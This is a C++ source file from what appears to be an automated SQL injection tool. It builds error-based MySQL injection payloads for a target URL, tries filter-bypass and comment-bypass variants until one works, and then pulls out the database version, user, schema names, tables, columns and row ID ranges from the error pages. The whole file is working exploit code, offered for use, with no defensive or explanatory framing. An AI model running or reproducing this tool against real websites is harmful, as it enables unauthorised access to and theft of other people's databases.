#include "exploit2.hpp"
#include "config.hpp"
#include "http_client.hpp"
#include "util.hpp"
#include <iostream>

namespace sqlij {

static std::string buildExploit2Url(Exploit2Params& p, const std::string& payload) {
    auto sec = arrSecBypass2();
    std::string e1 = sec[p.secBypass].first + " And (Select 1 From(Select Count(*),Concat(CHAR(58,58,58),";
    std::string e2 = ",floor(rand(0)*2),CHAR(58,58,58))x From Information_Schema.Tables Group By x)a) " + sec[p.secBypass].second + p.commentBypass;
    return urlEncode(p.url + e1 + payload + e2);
}

bool exploit2AutoDetect(Exploit2Params& p) {
    p.url = replaceAll(p.url, "'", "");
    auto secList = arrSecBypass2();
    auto commentList = arrCommentBypass();
    for (size_t i = 0; i < secList.size(); ++i) {
        for (size_t j = 0; j < commentList.size(); ++j) {
            std::string e1 = commentList[j].first + secList[i].first + " And (Select 1 From(Select Count(*),Concat(CHAR(58,58,58),";
            std::string e2 = ",floor(rand(0)*2),CHAR(58,58,58))x From Information_Schema.Tables Group By x)a) " + secList[i].second + commentList[j].second;
            std::string url = urlEncode(p.url + e1 + "(Version())" + e2);
            std::string page = getPage(url);
            std::string match;
            if (extractBetween(page, ":::", "1:::", match) || page.find(":::") != std::string::npos) {
                p.secBypass = static_cast<int>(i);
                p.commentBypass = commentList[j].second;
                if (!commentList[j].first.empty())
                    p.url = p.url + commentList[j].first;
                return true;
            }
        }
    }
    return false;
}

bool exploit2GetInfo(Exploit2Params& p, std::string& version, std::string& user, std::string& database) {
    std::string url = buildExploit2Url(p, "(Version())");
    std::string page = getPage(url);
    if (!extractBetween(page, ":::", "1:::", version)) {
        if (extractBetween(page, ":::", ":::", version)) { /* ok */ }
        else return false;
    }

    url = buildExploit2Url(p, "(User())");
    page = getPage(url);
    if (!extractBetween(page, ":::", "1:::", user))
        extractBetween(page, ":::", ":::", user);

    url = buildExploit2Url(p, "(Database())");
    page = getPage(url);
    if (!extractBetween(page, ":::", "1:::", database))
        extractBetween(page, ":::", ":::", database);
    return true;
}

bool exploit2GetDbs(Exploit2Params& p, std::vector<std::string>& dbs) {
    dbs.clear();
    if (p.useGroupConcat) {
        const int maxIter = 500;
        int m = 1;
        int len = (p.strlen < 40 || p.strlen > 130) ? 50 : p.strlen;
        std::string store;
        for (int iter = 0; iter < maxIter; ++iter) {
            std::string payload = "(Select substr(Group_Concat(Schema_Name)," + std::to_string(m) + "," + std::to_string(len) + ") From Information_Schema.Schemata)";
            std::string url = buildExploit2Url(p, payload);
            std::string page = getPage(url);
            std::string block;
            if (!extractBetween(page, ":::", "1:::", block) && !extractBetween(page, ":::", ":::", block)) {
                if (!store.empty()) { dbs.push_back(trim(store)); }
                break;
            }
            block = store + block;
            if (block.empty()) break;
            if (block.back() == ',') {
                block.pop_back();
                dbs.push_back(trim(block));
                break;
            }
            size_t lastComma = block.rfind(',');
            if (lastComma != std::string::npos) {
                store = block.substr(lastComma);
                block = block.substr(0, lastComma);
                std::vector<std::string> parts;
                split(block, ',', parts);
                for (const auto& s : parts) {
                    std::string t = trim(s);
                    if (!t.empty()) dbs.push_back(t);
                }
            } else {
                store = block;
                if (static_cast<int>(block.size()) < len)
                    break;
            }
            m += len;
        }
        return true;
    }
    int offset = 0;
    while (true) {
        std::string payload = "(Select Schema_Name From Information_Schema.Schemata Limit " + std::to_string(offset) + ",1)";
        std::string url = buildExploit2Url(p, payload);
        std::string page = getPage(url);
        std::string block;
        if (!extractBetween(page, ":::", "1:::", block)) {
            if (!extractBetween(page, ":::", ":::", block)) break;
        }
        if (trim(block).empty()) break;
        dbs.push_back(trim(block));
        offset++;
    }
    return true;
}

bool exploit2GetTables(Exploit2Params& p, const std::string& db, std::vector<std::string>& tables) {
    tables.clear();
    if (p.useGroupConcat) {
        const int maxIter = 500;
        int m = 1;
        int len = (p.strlen < 1 || p.strlen > 50) ? 50 : p.strlen;
        std::string store;
        for (int iter = 0; iter < maxIter; ++iter) {
            std::string payload = "(Select substr(Group_Concat(Table_Name)," + std::to_string(m) + "," + std::to_string(len) + ") From Information_Schema.Tables Where Table_Schema=" + asciiMysql(db) + ")";
            std::string url = buildExploit2Url(p, payload);
            std::string page = getPage(url);
            std::string block;
            if (!extractBetween(page, ":::", "1:::", block) && !extractBetween(page, ":::", ":::", block)) {
                if (!store.empty()) { tables.push_back(trim(store)); }
                break;
            }
            block = store + block;
            if (block.empty()) break;
            if (block.back() == ',') {
                block.pop_back();
                tables.push_back(trim(block));
                break;
            }
            size_t lastComma = block.rfind(',');
            if (lastComma != std::string::npos) {
                store = block.substr(lastComma);
                block = block.substr(0, lastComma);
                std::vector<std::string> parts;
                split(block, ',', parts);
                for (const auto& s : parts) {
                    std::string t = trim(s);
                    if (!t.empty()) tables.push_back(t);
                }
            } else {
                store = block;
                if (static_cast<int>(block.size()) < len)
                    break;
            }
            m += len;
        }
        return true;
    }
    int offset = 0;
    while (true) {
        std::string payload = "(Select Table_Name From Information_Schema.Tables Where Table_Schema=" + asciiMysql(db) + " Limit " + std::to_string(offset) + ",1)";
        std::string url = buildExploit2Url(p, payload);
        std::string page = getPage(url);
        std::string block;
        if (!extractBetween(page, ":::", "1:::", block)) {
            if (!extractBetween(page, ":::", ":::", block)) break;
        }
        if (trim(block).empty()) break;
        tables.push_back(trim(block));
        offset++;
    }
    return true;
}

bool exploit2GetColumns(Exploit2Params& p, const std::string& db, const std::string& table, std::vector<std::string>& columns) {
    columns.clear();
    if (p.useGroupConcat) {
        const int maxIter = 500;
        int m = 1;
        int len = (p.strlen < 1 || p.strlen > 50) ? 50 : p.strlen;
        std::string store;
        for (int iter = 0; iter < maxIter; ++iter) {
            std::string payload = "(Select substr(Group_Concat(Column_Name)," + std::to_string(m) + "," + std::to_string(len) + ") From Information_Schema.Columns Where Table_Schema=" + asciiMysql(db) + " And Table_Name=" + asciiMysql(table) + ")";
            std::string url = buildExploit2Url(p, payload);
            std::string page = getPage(url);
            std::string block;
            if (!extractBetween(page, ":::", "1:::", block) && !extractBetween(page, ":::", ":::", block)) {
                if (!store.empty()) { columns.push_back(trim(store)); }
                break;
            }
            block = store + block;
            if (block.empty()) break;
            if (block.back() == ',') {
                block.pop_back();
                columns.push_back(trim(block));
                break;
            }
            size_t lastComma = block.rfind(',');
            if (lastComma != std::string::npos) {
                store = block.substr(lastComma);
                block = block.substr(0, lastComma);
                std::vector<std::string> parts;
                split(block, ',', parts);
                for (const auto& s : parts) {
                    std::string t = trim(s);
                    if (!t.empty()) columns.push_back(t);
                }
            } else {
                store = block;
                if (static_cast<int>(block.size()) < len)
                    break;
            }
            m += len;
        }
        return true;
    }
    int offset = 0;
    while (true) {
        std::string payload = "(Select Column_Name From Information_Schema.Columns Where Table_Schema=" + asciiMysql(db) + " And Table_Name=" + asciiMysql(table) + " Limit " + std::to_string(offset) + ",1)";
        std::string url = buildExploit2Url(p, payload);
        std::string page = getPage(url);
        std::string block;
        if (!extractBetween(page, ":::", "1:::", block)) {
            if (!extractBetween(page, ":::", ":::", block)) break;
        }
        if (trim(block).empty()) break;
        columns.push_back(trim(block));
        offset++;
    }
    return true;
}

bool exploit2GetIdRange(Exploit2Params& p, const std::string& db, const std::string& table, const std::string& column, std::string& cnt, std::string& maxId, std::string& minId) {
    std::string url = buildExploit2Url(p, "(Select Count(" + column + ") From " + db + "." + table + ")");
    std::string page = getPage(url);
    if (!extractBetween(page, ":::", "1:::", cnt)) extractBetween(page, ":::", ":::", cnt);

    url = buildExploit2Url(p, "(Select Max(" + column + ") From " + db + "." + table + ")");
    page = getPage(url);
    if (!extractBetween(page, ":::", "1:::", maxId)) extractBetween(page, ":::", ":::", maxId);

    url = buildExploit2Url(p, "(Select Min(" + column + ") From " + db + "." + table + ")");
    page = getPage(url);
    if (!extractBetween(page, ":::", "1:::", minId)) extractBetween(page, ":::", ":::", minId);
    return true;
}

} // namespace sqlij
